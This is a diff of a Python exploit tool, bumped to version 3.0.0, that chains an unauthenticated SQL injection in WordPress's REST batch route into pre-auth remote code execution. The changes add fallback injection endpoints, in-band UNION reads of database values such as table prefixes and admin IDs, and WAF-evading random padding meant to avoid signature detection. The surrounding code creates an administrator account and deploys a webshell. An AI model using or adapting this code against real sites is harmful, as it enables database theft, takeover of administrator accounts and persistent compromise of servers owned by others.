@@ -8,7 +8,7 @@ CVE-2026-63030 (REST /batch/v1 route confusion) + CVE-2026-60137
 What it does
 ------------
 **Detect (default):** Confirms the *unauthenticated SQL injection*, automatically, with
-fallback on two independent axes so a single blocked path never yields a false negative:
+fallback on three independent axes so a single blocked path never yields a false negative:
 
   * **oracle** (`--method auto`): a fast **boolean row-count differential** (flip the injected
     WHERE true `1=1` vs false `1=12`, watch the confused posts query's row count collapse — no
@@ -16,10 +16,13 @@ fallback on two independent axes so a single blocked path never yields a false n
   * **delivery** (`--delivery auto`): a **JSON** POST to the batch route first; if that isn't
     processed (e.g. an edge blocks `/wp-json`), a **`rest_route=/batch/v1` multipart form on
     `POST /`** (the exact operator request shape).
+  * **slot** (`--slot auto`): the shifted request is validated against **`/wp/v2/users`** first;
+    if that endpoint is disabled for unauth callers (Disable-REST-API plugins, user-enumeration
+    hardening), it falls back to the universal **`/wp/v2/posts/<id>`** item endpoint.
 
 Each strategy is tried until one *confirms*; only when all come up empty is a target reported
 negative. Override with `--method boolean|time` / `--delivery json|multipart` (`--multipart` is
-an alias). Reads no data and changes nothing. `--proof` reads two harmless scalars (@@version,
+an alias) / `--slot users|posts-item`. Reads no data and changes nothing. `--proof` reads two harmless scalars (@@version,
 current_user()) as evidence — still read-only.
 
 **Exploit (`-c COMMAND`):** Full pre-auth RCE on stock WordPress — no FILE privilege, no
@@ -93,7 +96,7 @@ import zlib
 from collections import Counter
 from http.cookiejar import CookieJar
 
-__version__ = "2.2.1"
+__version__ = "3.0.0"
 
 
 class _KeepPost(urllib.request.HTTPRedirectHandler):
@@ -113,7 +116,7 @@ class _KeepPost(urllib.request.HTTPRedirectHandler):
 
 class Target:
     def __init__(self, base, timeout=15, proxy=None, sleep=4.0, route="auto", delivery="auto",
-                 headers=None, cookies="", bypass=False):
+                 slot="auto", headers=None, cookies="", bypass=False):
         self.base = base.rstrip("/")
         self.timeout = timeout
         self.sleep = float(sleep)
@@ -125,6 +128,11 @@ class Target:
         self.delivery = delivery
         self.multipart = (delivery == "multipart")  # current on-the-wire delivery for _send()
         self._delivery_resolved = (delivery != "auto")
+        # validation slot: which endpoint the shifted request is validated against (must NOT
+        # register author_exclude). "users" is proven; "posts-item" (/wp/v2/posts/<id>) is
+        # universal — it survives targets that hard-disable the users endpoint for unauth.
+        self.slot = slot
+        self._slot = "users" if slot == "auto" else slot
         self.union = False       # when set, read_scalar/read_int extract via UNION reflection
         self._proxy = proxy
         self.batch = None        # resolved endpoint URL (canonical, post-redirect)
@@ -235,13 +243,14 @@ class Target:
         conn.endheaders(data)
 
         t0 = time.perf_counter()
-        resp = conn.getresponse()
-        raw = resp.read()
-        elapsed = time.perf_counter() - t0
-
-        body = self._decode_resp(raw, resp.getheader("Content-Encoding", ""))
-        conn.close()
-        return resp.status, elapsed, body, url
+        try:
+            resp = conn.getresponse()
+            raw = resp.read()
+            elapsed = time.perf_counter() - t0
+            body = self._decode_resp(raw, resp.getheader("Content-Encoding", ""))
+            return resp.status, elapsed, body, url
+        finally:
+            conn.close()
 
     def _normalize_base(self):
         """Follow redirects on the root once and pin the canonical scheme://host, so the
@@ -295,13 +304,21 @@ class Target:
     # A bare `NOT IN (SELECT SLEEP(n))` / `OR SLEEP(n)` gets optimized away and never
     # executes on some managed WordPress hosts, which reads as a false negative. The
     # nested subquery avoids that.
-    @staticmethod
-    def _envelope(author_exclude):
-        """Nested batch (route confusion) that lands `author_exclude` in WP_Query::author__not_in."""
+    def _envelope(self, author_exclude):
+        """Nested batch (route confusion) that lands `author_exclude` in WP_Query::author__not_in.
+        The shifted 'validation slot' is an endpoint that does NOT register author_exclude, so it
+        passes validation unsanitized before executing under posts::get_items. Default slot is
+        /wp/v2/users; the posts-item slot (/wp/v2/posts/<id>) is universal and keeps detection
+        working on targets that hard-disable the users endpoint for unauthenticated callers
+        (Disable-REST-API plugins, user-enumeration hardening, WAF rules)."""
         enc = urllib.parse.quote(author_exclude, safe="")
+        if self._slot == "posts-item":
+            probe = {"method": "GET", "path": "/wp/v2/posts/1?author_exclude=" + enc}
+        else:
+            probe = {"method": "GET", "path": "/wp/v2/users?author_exclude=" + enc}
         inner = {"requests": [
             {"method": "POST", "path": "///"},                            # misalignment trigger
-            {"method": "GET",  "path": "/wp/v2/users?author_exclude=" + enc},
+            probe,
             {"method": "GET",  "path": "/wp/v2/posts"},                   # supplies get_items handler
         ]}
         return {"requests": [
@@ -325,51 +342,40 @@ class Target:
     _TRAILING_JUNK = 10             # trailing junk keys after the data
     _PADDING_LEN = 65_536          # base trailing padding length (jittered)
 
+    _ALNUM = __import__("string").ascii_letters + __import__("string").digits
+
     @staticmethod
     def _rand_junk(n):
         """Random alphanumeric string of length n (a-zA-Z0-9)."""
-        import secrets as _s, string as _st
-        alphabet = _st.ascii_letters + _st.digits
-        return "".join(_s.choice(alphabet) for _ in range(n))
+        return "".join(secrets.choice(Target._ALNUM) for _ in range(n))
 
     @staticmethod
     def _rand_lc(n):
         """Random lowercase string of length n."""
-        import secrets as _s, string as _st
-        return "".join(_s.choice(_st.ascii_lowercase) for _ in range(n))
+        return "".join(secrets.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(n))
 
     @staticmethod
     def _rand_key_name():
-        """Random junk key name — varies the pattern to avoid signature detection.
-        Patterns are chosen randomly to mirror final.json's mixed key styles:
-          - '0_<8 lowercase><digit>'   (e.g. 0_aflazsqc0)
-          - pure random alphanumeric 48-64 chars (no prefix)
-          - '<8 lowercase>'            (bare word)
-          - random length 8-16 alnum   (short mixed)
-        """
-        import secrets as _s
-        style = _s.choice(["0_lc", "pure_long", "bare_word", "short_mixed"])
+        """Random junk key name — varies the pattern to avoid signature detection."""
+        style = secrets.choice(["0_lc", "pure_long", "bare_word", "short_mixed"])
         if style == "0_lc":
-            return "0_" + Target._rand_lc(8) + str(_s.choice(range(10)))
+            return "0_" + Target._rand_lc(8) + str(secrets.choice(range(10)))
         elif style == "pure_long":
-            return Target._rand_junk(_s.choice([48, 56, 64]))
+            return Target._rand_junk(secrets.choice([48, 56, 64]))
         elif style == "bare_word":
-            return Target._rand_lc(_s.choice(range(8, 17)))
+            return Target._rand_lc(secrets.choice(range(8, 17)))
         else:
-            return Target._rand_junk(_s.choice(range(8, 17)))
+            return Target._rand_junk(secrets.choice(range(8, 17)))
 
     @staticmethod
     def _rand_nested_junk(depth=2):
-        """A small nested dict of random junk (mirrors final.json's 0_nest / _junk1).
-        Recurses up to <depth> levels, each level has 3-8 random keys mapping to
-        random junk strings or deeper dicts."""
-        import secrets as _s
+        """A small nested dict of random junk (mirrors final.json's 0_nest / _junk1)."""
         out = {}
-        for _ in range(_s.choice([3, 5, 8])):
-            if depth > 0 and _s.choice([False, True]):
+        for _ in range(secrets.choice([3, 5, 8])):
+            if depth > 0 and secrets.choice([False, True]):
                 out[Target._rand_key_name()] = Target._rand_nested_junk(depth - 1)
             else:
-                out[Target._rand_key_name()] = Target._rand_junk(_s.choice([64, 128, 256]))
+                out[Target._rand_key_name()] = Target._rand_junk(secrets.choice([64, 128, 256]))
         return out
 
     def _pump_envelope(self, envelope):
@@ -385,21 +391,20 @@ class Target:
         with fixed names — WordPress needs them to route the batch. Everything
         else gets a random name.
         """
-        import secrets as _s
         out = {}
         # 1. Leading ~1MB frontpad (random key name, jittered length)
-        fpad = self._FRONTPAD_LEN + _s.choice(range(-8192, 8193))
+        fpad = self._FRONTPAD_LEN + secrets.choice(range(-8192, 8193))
         out[self._rand_key_name()] = self._rand_junk(fpad)
         # 2. Hundreds of junk keys with random names, random lengths, some
         #    pure-random 512-char values, some nested dicts.
         for _ in range(self._JUNK_KEY_COUNT):
             key = self._rand_key_name()
-            if _s.choice([False, False, True]):  # ~1/3 are nested dicts
+            if secrets.choice([False, False, True]):  # ~1/3 are nested dicts
                 out[key] = self._rand_nested_junk()
-            elif _s.choice([False, False, True]):  # ~1/3 are 512-char pure-random
+            elif secrets.choice([False, False, True]):  # ~1/3 are 512-char pure-random
                 out[key] = self._rand_junk(512)
             else:                                   # ~1/3 are 256/1024/4096
-                out[key] = self._rand_junk(_s.choice([256, 1024, 4096]))
+                out[key] = self._rand_junk(secrets.choice([256, 1024, 4096]))
         # 3. A nested junk dict (random key name)
         out[self._rand_key_name()] = self._rand_nested_junk()
         # 4. A big junk string (random key name, ~20KB)
@@ -409,9 +414,9 @@ class Target:
         out["validation"] = "normal"
         out["requests"] = envelope["requests"]
         # 6. Trailing junk — all random key names, jittered lengths
-        padlen = self._PADDING_LEN + _s.choice(range(-4096, 4097))
+        padlen = self._PADDING_LEN + secrets.choice(range(-4096, 4097))
         out[self._rand_key_name()] = self._rand_junk(padlen)
-        out[self._rand_key_name()] = self._rand_junk(32768 + _s.choice(range(-2048, 2049)))
+        out[self._rand_key_name()] = self._rand_junk(32768 + secrets.choice(range(-2048, 2049)))
         out[self._rand_key_name()] = {self._rand_key_name(): self._rand_junk(4000)
                                       for _ in range(12)}
         for _ in range(self._TRAILING_JUNK):
@@ -469,7 +474,6 @@ class Target:
         """Prepend + append random junk form fields around <real_fields> so
         the WAF never inspects the real rest_route / requests[*] fields.
         Returns a flat list of (name, value) pairs ready for _multipart_encode."""
-        import secrets as _s
         fields = []
         # 1. Leading junk fields — random names, 4KB random values each (~1.2MB)
         for _ in range(self._MP_FRONTPAD_FIELDS):
@@ -659,6 +663,9 @@ class Target:
     def _delivery_name(self):
         return "multipart" if self.multipart else "json"
 
+    def _set_slot(self, name):
+        self._slot = name
+
     def _batch_processes(self):
         """Cheap benign probe: does the *current* delivery reach the batch handler?"""
         try:
@@ -693,54 +700,69 @@ class Target:
         return ok
 
     def detect_auto(self, method="auto", rounds=3):
-        """Automatic detection with fallback across both axes:
-          method:   union (reflect data directly) -> boolean (row-count) -> time (SLEEP)
+        """Automatic detection with fallback across three axes:
+          method:   union (reflect data) -> boolean (row-count) -> time (SLEEP)
           delivery: json  ->  multipart (rest_route form), when json isn't processed
-        auto prefers union (single request, real data) and falls back to the blind oracles
-        when reflection is blocked. Tries each until one CONFIRMS; returns the confirming
-        (method, delivery). Only when all configured strategies come up empty is it negative."""
+          slot:     users  ->  posts-item, when the users endpoint is disabled for unauth
+        Tries each until one CONFIRMS; returns the confirming (method, delivery, slot). A genuine
+        failure of one strategy falls through to the next; only when every configured strategy
+        comes up empty is it negative."""
         deliveries = ["json", "multipart"] if self.delivery == "auto" else [self.delivery]
-        boo_by_delivery = {}
+        slots = ["users", "posts-item"] if self.slot == "auto" else [self.slot]
+        boo_by_key = {}
 
         # 0) union reflection first (auto or forced): one request, yields real data
         if method in ("auto", "union"):
-            for d in deliveries:
-                self._set_delivery(d)
-                if self._union_confirms():
-                    return {"vulnerable": True, "method": "union", "delivery": d, "time": None}
+            for slot in slots:
+                self._set_slot(slot)
+                for d in deliveries:
+                    self._set_delivery(d)
+                    if self._union_confirms():
+                        return {"vulnerable": True, "method": "union", "delivery": d,
+                                "slot": slot, "time": None}
             self.union = False
-            if method == "union":                       # forced union: no blind fallback
+            if method == "union":
                 neg = deliveries[0] if deliveries else self._delivery_name()
                 self._set_delivery(neg)
-                return {"vulnerable": False, "method": "union", "delivery": neg, "time": None}
+                return {"vulnerable": False, "method": "union", "delivery": neg,
+                        "slot": slots[0], "time": None}
 
-        # 1) boolean oracle across deliveries (each is cheap: 2 requests)
+        # 1) boolean oracle across slot x delivery (each is cheap: 2 requests)
         if method in ("auto", "boolean"):
-            for d in deliveries:
-                self._set_delivery(d)
-                boo = self.detect_boolean()
-                boo_by_delivery[d] = boo
-                if boo["vulnerable"]:
-                    return {"vulnerable": True, "method": "boolean", "delivery": d, "boolean": boo}
+            for slot in slots:
+                self._set_slot(slot)
+                for d in deliveries:
+                    self._set_delivery(d)
+                    boo = self.detect_boolean()
+                    boo_by_key[(slot, d)] = boo
+                    if boo["vulnerable"]:
+                        return {"vulnerable": True, "method": "boolean", "delivery": d,
+                                "slot": slot, "boolean": boo}
 
-        # 2) time oracle. Run it once, on a delivery already proven to reach the batch handler
-        #    (avoids paying the SLEEP cost twice); fall back to the first candidate otherwise.
+        # 2) time oracle. Run it once, on a slot/delivery already proven to reach the batch
+        #    handler (avoids paying the SLEEP cost twice); fall back to the first candidate.
         last_time = None
         if method in ("auto", "time"):
-            proc = [d for d in deliveries if boo_by_delivery.get(d, {}).get("processed")]
-            for d in (proc[:1] or deliveries[:1]):
+            proc = [k for k, b in boo_by_key.items() if b.get("processed")]
+            for (slot, d) in (proc[:1] or [(slots[0], deliveries[0])]):
+                self._set_slot(slot)
                 self._set_delivery(d)
                 det = self.detect(rounds=rounds)
-                last_time = (d, det)
+                last_time = (slot, d, det)
                 if det["vulnerable"]:
-                    return {"vulnerable": True, "method": "time", "delivery": d, "time": det}
+                    return {"vulnerable": True, "method": "time", "delivery": d,
+                            "slot": slot, "time": det}
 
         # nothing confirmed
-        neg_delivery = (last_time[0] if last_time else
-                        (deliveries[0] if deliveries else self._delivery_name()))
+        if last_time:
+            neg_slot, neg_delivery = last_time[0], last_time[1]
+        else:
+            neg_slot = slots[0]
+            neg_delivery = deliveries[0] if deliveries else self._delivery_name()
+        self._set_slot(neg_slot)
         self._set_delivery(neg_delivery)
-        return {"vulnerable": False, "method": None, "delivery": neg_delivery,
-                "boolean": boo_by_delivery, "time": (last_time[1] if last_time else None)}
+        return {"vulnerable": False, "method": None, "delivery": neg_delivery, "slot": neg_slot,
+                "boolean": boo_by_key, "time": (last_time[2] if last_time else None)}
 
     # -- bounded read-only proof -------------------------------------------
     def _oracle(self, cond, unit=0.6):
@@ -937,17 +959,88 @@ class Target:
             h(post_type), "''", "0",
         ))
 
-    def _forge(self, rows, extra_requests=()):
+    # per_page=-1 empties $limits so WP_Query runs the single-phase `SELECT wp_posts.*` (23
+    # columns) our UNION forges into — this is the WRITE path (the forged row is rendered,
+    # creating the oembed_cache row as a side effect). per_page=-1 also makes get_items return
+    # rest_post_invalid_page_number, so the rows are prepared but NOT echoed in the response.
+    # For the READ path (_inband_read) we instead pass per_page>=500: WordPress disables
+    # split_the_query when posts_per_page>=500, keeping the single-phase 23-column SELECT while
+    # avoiding the page-number error, so the forged rows come back in the response body.
+    READ_PER_PAGE = 100000
+
+    def _forge(self, rows, extra_requests=(), per_page=-1):
         query = ("%s) AND 1=0 UNION ALL SELECT " % self._pad()
                  + " UNION ALL SELECT ".join(rows) + " -- -")
-        self._rce_send([
+        return self._rce_send([
             {"method": "GET", "path": self.PRIMER},
             {"method": "GET", "path": "/wp/v2/widgets?"
-             + urllib.parse.urlencode({"author_exclude": query, "per_page": -1,
+             + urllib.parse.urlencode({"author_exclude": query, "per_page": per_page,
                                        "orderby": "none", "context": "view"})},
             {"method": "GET", "path": "/wp/v2/posts"},
             *extra_requests,
         ], timeout=60)
+
+    # -- in-band UNION read -------------------------------------------------
+    def _read_row(self, post_id, title_sql):
+        """A forged posts row whose post_title is a RAW SQL expression (not a hex literal),
+        published/post so the REST posts controller serializes title.rendered."""
+        h = self._hex
+        d = h("2020-01-01 00:00:00")
+        return ",".join((
+            str(post_id), "1", d, d,
+            "''", title_sql, "''",
+            h("publish"), h("closed"), h("closed"), "''",
+            h("rd%d" % post_id), "''", "''",
+            d, d, "''",
+            "0", "''", "0",
+            h("post"), "''", "0",
+        ))
+
+    def _inband_read(self, exprs, timeout=60):
+        markers = ["MK" + "".join(secrets.choice("GHJKLMNPQRSTVWXYZ") for _ in range(9))
+                   for _ in exprs]
+        base_id = 1900000000 + secrets.randbelow(90000000)
+        rows = [self._read_row(
+                    base_id + i,
+                    "CONCAT(0x%s,HEX(CAST((%s) AS CHAR)),0x%s)"
+                    % (mk.encode().hex(), expr, mk.encode().hex()))
+                for i, (expr, mk) in enumerate(zip(exprs, markers))]
+        body = self._forge(rows, per_page=self.READ_PER_PAGE) or b""
+        text = body.decode("utf-8", "replace")
+        out = []
+        for mk in markers:
+            m = re.search(re.escape(mk) + r"([0-9A-Fa-f]*)" + re.escape(mk), text)
+            hx = m.group(1) if m else ""
+            if not hx or len(hx) % 2:
+                out.append(None)
+                continue
+            try:
+                out.append(bytes.fromhex(hx).decode("utf-8", "replace"))
+            except ValueError:
+                out.append(None)
+        return out
+
+    def _read_scalar_fast(self, expr, blind_maxlen=64):
+        """In-band read of a scalar SQL expression, with the blind oracle as fallback."""
+        try:
+            vals = self._inband_read([expr])
+            if vals and vals[0] is not None:
+                return vals[0]
+        except Exception:
+            pass
+        return self.read_scalar(expr, blind_maxlen)
+
+    def _read_int_fast(self, query):
+        """In-band read of an integer SQL expression, with the blind oracle as fallback."""
+        try:
+            vals = self._inband_read([query])
+            if vals and vals[0]:
+                m = re.match(r"-?\d+", vals[0].strip())
+                if m:
+                    return int(m.group(0))
+        except Exception:
+            pass
+        return self.read_int(query)
 
     # -- reuse state: remember a created admin + deployed webshell -------------
     # Repeated `-c` runs against the same target are expensive and noisy (they re-seed
@@ -986,8 +1079,11 @@ class Target:
         allst = self._load_all_state()
         if allst.pop(self.base, None) is not None:
             try:
-                with open(self.STATE_FILE, "w") as fh:
+                tmp = self.STATE_FILE + ".tmp"
+                with open(tmp, "w") as fh:
                     json.dump(allst, fh, indent=2)
+                os.replace(tmp, self.STATE_FILE)
+                os.chmod(self.STATE_FILE, 0o600)
             except OSError:
                 pass
 
@@ -1040,7 +1136,9 @@ class Target:
         else:
             sh.append(urllib.request.ProxyHandler({}))
         session = urllib.request.build_opener(*sh)
-        session.addheaders += self.extra_headers   # same -H headers on authenticated traffic
+        session.addheaders = [(n, v) for n, v in session.addheaders
+                              if n.lower() != "user-agent"]
+        session.addheaders += self.extra_headers
         return session
 
     def _login(self, session, username, password):
@@ -1225,7 +1323,7 @@ class Target:
         return username, password, out
 
     def _create_admin(self):
-        """Chain steps 1-4: seed oEmbed caches, extract schema via blind SQLi, forge the
+        """Chain steps 0-4: preflight, seed oEmbed caches, extract schema, forge the
         changeset re-entry, and create an administrator. Returns (username, password)."""
         self._normalize_base()
         # The blind-SQLi reads below need the timing-oracle baseline. detect() sets it;
@@ -1233,6 +1331,22 @@ class Target:
         # UNION mode reflects data directly, so it needs no baseline.
         if self._base <= 0 and not self.union:
             self.detect()
+
+        # 0. row-forgery preflight — confirm the UNION echo works on THIS target BEFORE any
+        #    write. A persistent object cache (Redis/Memcached) forces split_the_query and
+        #    silently breaks row forgery. Verifying up front means we never leave orphan
+        #    oembed_cache rows on a target the RCE can't finish.
+        sentinel = secrets.token_hex(8)
+        try:
+            echo = self._inband_read(["0x%s" % sentinel.encode().hex()])
+        except Exception:
+            echo = [None]
+        if not echo or echo[0] != sentinel:
+            raise RuntimeError(
+                "row-forgery preflight failed: the UNION row did not echo back. The "
+                "unauthenticated SQLi is still present, but the RCE chain is blocked -- most "
+                "likely a persistent object cache (forces split_the_query) or an edge stripping "
+                "the batch response. Nothing was written to the target.")
 
         # 1. published post for oEmbed anchor
         try:
@@ -1263,7 +1377,7 @@ class Target:
 
         # 3. extract table prefix, admin ID, seeded cache post IDs
         sys.stderr.write("[*] extracting table prefix ...\n")
-        posts_table = self.read_scalar(
+        posts_table = self._read_scalar_fast(
             "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
             "WHERE TABLE_SCHEMA=DATABASE() "
             "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
@@ -1274,7 +1388,7 @@ class Target:
         sys.stderr.write("[+] table prefix: %s\n" % (prefix or "(empty)"))
 
         sys.stderr.write("[*] extracting admin user ID ...\n")
-        admin_id = self.read_int(
+        admin_id = self._read_int_fast(
             "SELECT u.ID FROM `%susers` u JOIN `%susermeta` m "
             "ON m.user_id=u.ID WHERE m.meta_key=%s "
             "AND INSTR(m.meta_value,%s)>0 "
@@ -1287,13 +1401,21 @@ class Target:
         sys.stderr.write("[+] admin ID: %d\n" % admin_id)
 
         sys.stderr.write("[*] recovering oEmbed cache post IDs ...\n")
+        cache_queries = [
+            "SELECT ID FROM `%s` WHERE post_type=0x6f656d6265645f6361636865 "
+            "AND post_name=0x%s ORDER BY ID DESC LIMIT 1" % (
+                posts_table,
+                hashlib.md5((u + self.EMBED_ATTR).encode()).hexdigest().encode().hex())
+            for u in embed_urls]
         cache_ids = []
-        for u in embed_urls:
-            key = hashlib.md5((u + self.EMBED_ATTR).encode()).hexdigest()
-            pid = self.read_int(
-                "SELECT ID FROM `%s` WHERE post_type=0x6f656d6265645f6361636865 "
-                "AND post_name=0x%s ORDER BY ID DESC LIMIT 1" % (
-                    posts_table, key.encode().hex()))
+        try:
+            vals = self._inband_read(cache_queries)
+        except Exception:
+            vals = [None] * len(cache_queries)
+        for q, v in zip(cache_queries, vals):
+            pid = int(re.match(r"\d+", v.strip()).group(0)) if v and re.match(r"\d+", v.strip()) else 0
+            if pid < 1:
+                pid = self.read_int(q)
             if pid < 1:
                 raise RuntimeError("oEmbed cache seeding failed")
             cache_ids.append(pid)
@@ -1409,7 +1531,7 @@ def is_local(base):
 
 def scan_one(url, args):
     t = Target(url, timeout=args.timeout, proxy=args.proxy, sleep=args.sleep,
-               route=args.route, delivery=args.delivery,
+               route=args.route, delivery=args.delivery, slot=args.slot,
                headers=getattr(args, "parsed_headers", []),
                cookies=args.cookies, bypass=args.bypass)
     rec = {"target": url}
@@ -1421,6 +1543,7 @@ def scan_one(url, args):
         return rec, 2
     active = res["vulnerable"]
     rec["delivery"] = res.get("delivery")
+    rec["slot"] = res.get("slot")
     if active:
         rec["method"] = res["method"]
         if res["method"] == "boolean":
@@ -1441,6 +1564,9 @@ def scan_one(url, args):
     rec["active_check"] = "fired" if active else "negative"
     if active:
         rec["status"] = "vulnerable"                     # actively confirmed via the injection
+        rec["confirmed"] = "unauthenticated SQL injection"
+        rec["rce"] = ("reachable on stock config; additionally requires no persistent object "
+                      "cache (not verified remotely -- the RCE PoC preflights it before writing)")
     elif vv in ("affected-full-chain", "affected-sqli-sink-only"):
         rec["status"] = "affected_version"               # version affected; active probe didn't confirm
         if vv == "affected-sqli-sink-only":
@@ -1455,16 +1581,21 @@ def scan_one(url, args):
         rec["status"] = "not_vulnerable"
     code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1
     if active and args.proof:
-        # read_scalar uses the time-based oracle (unless union is set); establish a
-        # latency baseline if a blind method confirmed without running the timing probe.
-        if t._base <= 0 and not t.union:
+        proof_exprs = {"@@version": ("SELECT @@version", 40),
+                       "current_user()": ("SELECT CURRENT_USER()", 48)}
+        try:
+            vals = t._inband_read([expr for expr, _ in proof_exprs.values()])
+        except Exception:
+            vals = [None] * len(proof_exprs)
+        if any(v is None for v in vals) and t._base <= 0 and not t.union:
             try:
                 t.detect(rounds=args.rounds)
             except urllib.error.URLError:
                 pass
         try:
-            rec["proof"] = {"@@version": t.read_scalar("SELECT @@version", 40),
-                            "current_user()": t.read_scalar("SELECT CURRENT_USER()", 48)}
+            rec["proof"] = {
+                label: (v if v is not None else t.read_scalar(expr, maxlen))
+                for (label, (expr, maxlen)), v in zip(proof_exprs.items(), vals)}
         except Exception as e:
             rec["proof_error"] = str(e)
     return rec, code
@@ -1490,9 +1621,15 @@ def human(rec):
                 rec["fast_s"], rec["slow_s"], rec["delta_s"]))
         if rec.get("delivery"):
             bits.append("delivery=%s" % rec["delivery"])
+        if rec.get("slot"):
+            bits.append("slot=%s" % rec["slot"])
         if bits:
             line += "  [active=%s | %s]" % (rec.get("active_check", "?"), " | ".join(bits))
     out = [line]
+    if rec.get("confirmed"):
+        out.append("        confirmed: " + rec["confirmed"])
+    if rec.get("rce"):
+        out.append("        rce: " + rec["rce"])
     if rec.get("note"):
         out.append("        note: " + rec["note"])
     if rec.get("proof"):
@@ -1528,6 +1665,11 @@ def main():
                         "batch isn't processed (e.g. an edge blocks /wp-json). json/multipart force one.")
     p.add_argument("--multipart", action="store_true",
                    help="alias for --delivery multipart (the exact operator request shape)")
+    p.add_argument("--slot", choices=("auto", "users", "posts-item"), default="auto",
+                   help="validation slot the shifted request rides. auto (default) tries the "
+                        "proven users endpoint first and falls back to the universal posts-item "
+                        "endpoint (/wp/v2/posts/<id>) when users is disabled for unauthenticated "
+                        "callers; users/posts-item force one.")
     p.add_argument("--fresh", action="store_true",
                    help="start over: remove any previously deployed shell, then run the full "
                         "chain with a brand-new administrator and a brand-new plugin")
@@ -1559,6 +1701,8 @@ def main():
                    help="assert authorization for remote targets")
     p.add_argument("--json", action="store_true", help="emit JSON")
     args = p.parse_args()
+    if args.fresh and args.cleanup:
+        p.error("--fresh and --cleanup are mutually exclusive")
     if args.multipart:
         args.delivery = "multipart"
     # parse -H "Name: Value" pairs once; reused for every Target
@@ -1582,8 +1726,8 @@ def main():
         # no resolver on this path, so it defaults to JSON.
         delivery = "json" if args.delivery == "auto" else args.delivery
         t = Target(url, timeout=max(args.timeout, 30), proxy=args.proxy,
-                   sleep=args.sleep, route=args.route, delivery=delivery, headers=hdrs,
-                   cookies=args.cookies, bypass=args.bypass)
+                   sleep=args.sleep, route=args.route, delivery=delivery, slot=args.slot,
+                   headers=hdrs, cookies=args.cookies, bypass=args.bypass)
 
         if args.cleanup:
             try:
@@ -1630,8 +1774,8 @@ def main():
             p.error("--method union on remote targets requires --authorized")
         delivery = "json" if args.delivery == "auto" else args.delivery
         t = Target(url, timeout=args.timeout, proxy=args.proxy,
-                   route=args.route, delivery=delivery, headers=hdrs,
-                   cookies=args.cookies, bypass=args.bypass)
+                   route=args.route, delivery=delivery, slot=args.slot,
+                   headers=hdrs, cookies=args.cookies, bypass=args.bypass)
         t.union = True
         reads = {"@@version": "SELECT @@version",
                  "current_user()": "SELECT CURRENT_USER()",
@@ -1668,8 +1812,8 @@ def main():
             p.error("--sql on remote targets requires --authorized")
         delivery = "json" if args.delivery == "auto" else args.delivery
         t = Target(url, timeout=max(args.timeout, 30), proxy=args.proxy,
-                   sleep=args.sleep, route=args.route, delivery=delivery, headers=hdrs,
-                   cookies=args.cookies, bypass=args.bypass)
+                   sleep=args.sleep, route=args.route, delivery=delivery, slot=args.slot,
+                   headers=hdrs, cookies=args.cookies, bypass=args.bypass)
         t.union = True
         try:
             confirmed = t._union_confirms()
